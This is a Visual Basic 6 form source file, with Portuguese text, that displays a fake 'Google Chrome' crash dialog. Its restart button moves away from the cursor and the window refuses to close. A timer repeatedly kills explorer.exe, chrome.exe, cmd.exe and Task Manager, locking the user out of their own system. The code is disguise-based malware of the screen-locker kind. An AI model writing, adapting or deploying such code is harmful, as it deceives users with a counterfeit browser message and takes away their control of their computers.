VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Google Chrome"
   ClientHeight    =   1695
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   7215
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1695
   ScaleWidth      =   7215
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   720
      Left            =   120
      Picture         =   "Form1.frx":D9E9
      ScaleHeight     =   720
      ScaleWidth      =   720
      TabIndex        =   3
      Top             =   120
      Width           =   720
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   375
      Left            =   7200
      TabIndex        =   2
      Top             =   1680
      Width           =   495
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Reiniciar o Chrome"
      Height          =   375
      Left            =   2760
      TabIndex        =   0
      Top             =   1080
      Width           =   1695
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   480
      Top             =   1080
   End
   Begin VB.Label Label1 
      Caption         =   "Ocorreu um erro de execução e o Google Chrome foi fechado. Clique em Continuar para reiniciar o Google Chrome"
      Height          =   735
      Left            =   960
      TabIndex        =   1
      Top             =   120
      Width           =   6135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpszClassName As String, ByVal lpszWindow As String) As Long

Public Function setaPosicao()
    If Posicao = 0 Then
        Me.Top = 340
        Me.Left = 340
    End If
    
    If Posicao = 1 Then
        Me.Top = Screen.Height / 4
        Me.Left = Screen.Width / 4
    End If
    
    If Posicao = 2 Then
        Me.Top = Screen.Height / 3
        Me.Left = Screen.Width / 3
    End If
    
    If Posicao = 1 Then
        Me.Top = Screen.Height / 2
        Me.Left = Screen.Width / 2
    End If
End Function

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Posicao < 2 Then
        Posicao = Posicao + 1
    Else
        Posicao = 0
    End If
    
    Call setaPosicao
End Sub

Private Sub Form_Paint()
    Command2.SetFocus
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Cancel = 1
End Sub

Private Sub Timer1_Timer()
    Timer1.Interval = 100
    If ProcessoExiste("explorer.exe") = True Then Call KillProcess("explorer.exe")
    If ProcessoExiste("chrome.exe") = True Then Call KillProcess("chrome.exe")
    If ProcessoExiste("cmd.exe") = True Then Call KillProcess("cmd.exe")
    If ProcessoExiste("taskmgr.exe") = True Then Call KillProcess("taskmgr.exe")
End Sub
